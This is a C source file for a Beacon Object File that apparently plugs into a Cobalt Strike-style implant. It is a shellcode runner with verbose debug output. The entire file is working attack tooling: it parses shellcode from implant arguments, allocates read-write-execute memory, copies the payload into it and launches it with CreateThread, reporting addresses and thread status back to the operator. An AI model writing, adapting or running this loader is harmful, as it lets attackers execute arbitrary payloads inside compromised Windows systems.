/*
 * shellcode_exec_debug.c - Shellcode execution with detailed debugging.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_debug.c -o shellcode_exec_debug.o
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetExitCodeThread(HANDLE, LPDWORD);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define PAGE_EXECUTE_READWRITE_VAL 0x40

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static void int_to_str(unsigned int val, char* buf) {
    if (val == 0) {
        buf[0] = '0';
        buf[1] = '\0';
        return;
    }
    char tmp[16];
    int i = 0;
    while (val > 0) {
        tmp[i++] = '0' + (val % 10);
        val /= 10;
    }
    int j = 0;
    while (i > 0) {
        buf[j++] = tmp[--i];
    }
    buf[j] = '\0';
}

static void hex_to_str(unsigned long long val, char* buf) {
    const char hex[] = "0123456789abcdef";
    buf[0] = '0';
    buf[1] = 'x';
    int pos = 2;
    if (val == 0) {
        buf[pos++] = '0';
        buf[pos] = '\0';
        return;
    }
    char tmp[20];
    int i = 0;
    while (val > 0) {
        tmp[i++] = hex[val & 0xF];
        val >>= 4;
    }
    while (i > 0) {
        buf[pos++] = tmp[--i];
    }
    buf[pos] = '\0';
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;
    char msg[256];
    char num_buf[32];

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    /* Log shellcode size */
    bof_memcpy(msg, "[DEBUG] Shellcode size: ", 24);
    int_to_str(shellcode_len, num_buf);
    int len = 24;
    for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
    bof_memcpy(msg + len, " bytes\n", 7);
    BeaconOutput(CALLBACK_OUTPUT, msg, len + 7);

    /* Allocate RWX memory */
    LPVOID exec_mem = KERNEL32$VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_EXECUTE_READWRITE_VAL
    );

    if (exec_mem == NULL) {
        DWORD err = KERNEL32$GetLastError();
        bof_memcpy(msg, "[ERROR] VirtualAlloc failed, error: ", 36);
        int_to_str(err, num_buf);
        len = 36;
        for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
        msg[len++] = '\n';
        BeaconOutput(CALLBACK_ERROR, msg, len);
        return;
    }

    /* Log allocated address */
    bof_memcpy(msg, "[DEBUG] Allocated at: ", 22);
    hex_to_str((unsigned long long)exec_mem, num_buf);
    len = 22;
    for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
    msg[len++] = '\n';
    BeaconOutput(CALLBACK_OUTPUT, msg, len);

    /* Copy shellcode */
    bof_memcpy(exec_mem, shellcode_data, shellcode_len);
    BeaconOutput(CALLBACK_OUTPUT, "[DEBUG] Shellcode copied\n", 25);

    /* Log first 16 bytes of shellcode */
    bof_memcpy(msg, "[DEBUG] First bytes: ", 21);
    len = 21;
    unsigned char* sc = (unsigned char*)exec_mem;
    for (int i = 0; i < 16 && i < shellcode_len; i++) {
        const char hex[] = "0123456789abcdef";
        msg[len++] = hex[(sc[i] >> 4) & 0xF];
        msg[len++] = hex[sc[i] & 0xF];
        msg[len++] = ' ';
    }
    msg[len++] = '\n';
    BeaconOutput(CALLBACK_OUTPUT, msg, len);

    /* Create thread */
    DWORD thread_id = 0;
    HANDLE hThread = KERNEL32$CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        &thread_id
    );

    if (hThread == NULL) {
        DWORD err = KERNEL32$GetLastError();
        bof_memcpy(msg, "[ERROR] CreateThread failed, error: ", 36);
        int_to_str(err, num_buf);
        len = 36;
        for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
        msg[len++] = '\n';
        BeaconOutput(CALLBACK_ERROR, msg, len);
        return;
    }

    /* Log thread ID */
    bof_memcpy(msg, "[DEBUG] Thread created, TID: ", 29);
    int_to_str(thread_id, num_buf);
    len = 29;
    for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
    msg[len++] = '\n';
    BeaconOutput(CALLBACK_OUTPUT, msg, len);

    /* Wait briefly to see if thread crashes immediately */
    DWORD wait_result = KERNEL32$WaitForSingleObject(hThread, 500);

    if (wait_result == 0) { /* WAIT_OBJECT_0 - thread exited */
        DWORD exit_code = 0;
        KERNEL32$GetExitCodeThread(hThread, &exit_code);
        bof_memcpy(msg, "[DEBUG] Thread exited quickly, code: ", 37);
        hex_to_str(exit_code, num_buf);
        len = 37;
        for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
        msg[len++] = '\n';
        BeaconOutput(CALLBACK_OUTPUT, msg, len);
    } else if (wait_result == 0x00000102) { /* WAIT_TIMEOUT */
        BeaconOutput(CALLBACK_OUTPUT, "[DEBUG] Thread still running after 500ms\n", 41);
    } else {
        DWORD err = KERNEL32$GetLastError();
        bof_memcpy(msg, "[ERROR] Wait failed, error: ", 28);
        int_to_str(err, num_buf);
        len = 28;
        for (int i = 0; num_buf[i]; i++) msg[len++] = num_buf[i];
        msg[len++] = '\n';
        BeaconOutput(CALLBACK_ERROR, msg, len);
    }

    KERNEL32$CloseHandle(hThread);
    BeaconOutput(CALLBACK_OUTPUT, "[DEBUG] BOF returning, thread detached\n", 39);
}
